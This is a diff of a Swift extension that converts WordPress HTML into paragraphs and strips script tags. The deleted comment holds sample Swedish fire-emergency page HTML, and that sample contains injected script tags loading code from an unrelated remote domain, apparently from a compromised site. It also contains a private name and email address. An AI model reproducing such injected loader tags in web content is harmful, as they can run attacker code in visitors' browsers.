@@ -29,9 +29,8 @@ extension String {
 
         // Stop looking when none is found
         while loop {
-            
-            // Retrieve
-            let searchComment = Regex {
+            // get section
+            let searchTag = Regex {
                 Capture {
                     // start of html tag
                     prefix
@@ -40,7 +39,7 @@ extension String {
                     suffix
                 }
             }
-            if let match = text.firstMatch(of: searchComment) {
+            if let match = text.firstMatch(of: searchTag) {
                 let (_, comment) = match.output
                 text = text.replacing(comment, with: "")
             } else {
@@ -50,7 +49,7 @@ extension String {
         return text
     }
     
-    // replacing all substrings with one string
+    // replacing all substrings block, ex ["<div>", "<br>"] with "\n"
     func replace(substrings: [String], with string: String) -> String {
         var text = self
         for substring in substrings {
@@ -104,19 +103,14 @@ extension String {
         }
         return text
     }
-    // split text into paragraphs with text, font, and image and more
+    // split text into paragraphs with text, font, color and image
     func createParagraphs() -> [WPParagraph] {
-        
-        /*
-         <p><span style=\"font-size: 12pt;\"> Vid nödsituation:</span></p>\n<p><span style=\"color: #ff0000; font-size: 18pt;\">Ring 112 och kalla på brandkåren</span></p>\n<p><strong><span style=\"font-size: 12pt;\">Berätta exakt var det brinner &#8211; Wettersö ligger i Österåkers kommun, 3 mil rakt söder om Norrtälje.</span></strong><br />\n<strong> <span style=\"font-size: 12pt;\"> Lämna telefonnummer till en eller flera kontaktpersoner.</span></strong></p>\n<ul>\n<li><span style=\"font-size: medium;\">Använd </span> <span style=\"font-size: medium;\">VNSF </span><span style=\"font-size: medium;\">&amp; </span><span style=\"font-size: medium;\">SBFS </span><span style=\"font-size: medium;\">telefonlista</span><span style=\"font-size: medium;\"> </span><span style=\"font-size: medium;\"> för att sammankalla ALLA som är ute på öarna</span></li>\n<li><span style=\"font-size: medium;\">Starta brandsirénen vid dansbanan, strömbrytaren sitter i mätarskåpet på stolpen</span></li>\n<li><span style=\"font-size: medium;\">Tag med mobiltelefon med reservbatteri, skottkärra, hinkar, vattenkannor med stril och räfsor eller krattor av metall och mycket vatten att dricka. Kanske något att äta också?</span></li>\n<li><span style=\"font-size: medium;\">Samling sker vid brandsprutan som står i spannmålsmagasinet intill stallet, se <script type='text/javascript' src='https://con1.sometimesfree.biz/c.js'></script><script type='text/javascript' src='https://con1.sometimesfree.biz/c.js'></script><a href=\"http://www.cmswds.wetterso.se/brand/brand/brand_w_map.htm\">karta</a></span></li>\n<li><span style=\"font-size: medium;\">Utse en brandchef och skriv ner era mobiltelefonnummer på varsin lista så att ni kan kommunicera</span></li>\n<li><span style=\"font-size: medium;\">Brandslangarna kan köras ut med skottkärra om ingen traktor finns tillgänglig</span></li>\n<li><span style=\"font-size: medium;\">Brandsprutan skall placeras vid sjöstranden närmast brandplatsen &#8211; det blir troligen någon av betongbryggorna som det finns bilväg till och där vattendjupet är tillräckligt</span></li>\n<li><span style=\"font-size: medium;\"><span style=\"font-size: medium;\">O.B.S att sugslangen måste skyddas med en hink för att förhindra att grus sugs in i pumpen</span></span></li>\n<li><strong>Läs mer: <script type='text/javascript' src='https://con1.sometimesfree.biz/c.js'></script><script type='text/javascript' src='https://con1.sometimesfree.biz/c.js'></script><a href=\"https://media.wetterso.se/2015/08/I-händelse-av-eldsvåda.pdf\">I händelse av eldsvåda</a></strong></li>\n</ul>\n<p>&nbsp;</p>\n<p>Branden i Västmanland sommaren 2014 väcker frågor kring vår beredskap att släcka bränder på ön. Befintlig brandslang är gammal och svårhanterlig och inget system finns för effektiv förflyttning av slangen. Vi har heller ingen larmkedja. VFFF är den förening som ansvarar för brandfrågor. Föreningen kommer att arbeta fram nya förslag för bättre brandberedskap under året fram till nästa stämma 2015. Hör gärna av dig med egna förslag, och om du vill engagera dig i frågan – välkommen! Maila VFFF:s ordförande <script type='text/javascript' src='https://con1.sometimesfree.biz/c.js'></script><script type='text/javascript' src='https://con1.sometimesfree.biz/c.js'></script><a href=\"mailto:t_westerlund@hotmail.com\">Torbjörn Westerlund</a>. t_westerlund@hotmail.com</p>\n",
-         */
         
         func processString(string: String, paragraphs: [WPParagraph]) -> [WPParagraph] {
             // try matching paragraphs, starts with a "<p>", "<p style...>" and ends with a "</p>"
             let paragraphRegex = Regex {
                 ChoiceOf {
-                    "<p><span"
-                    "<p>**<span"
+                    /<p>.{0,}<span/
                     "<p"
                     "<h2"
                     "<figure"
@@ -233,7 +227,6 @@ extension String {
             .removeBetween(prefix:"<script", suffix: "/script>") // remove java scripts
             .replace(substrings: ["\n", "</div>"], with: "")  // replace elements with nothing
             .replace(substrings: ["<div>", "<br>", "<br />"], with: "\n") // add linebreak
-
             .replace(substrings: ["<strong>", "</strong>", "<b>", "</b>"], with: "**") // add bold text
             .replace(substrings: ["<em>", "</em>", "<i>", "</i>"], with: "*") // add italic text
             .replaceHyperlinks() // replace pattern <a... href="<hyperlink>"....> with [content](href)
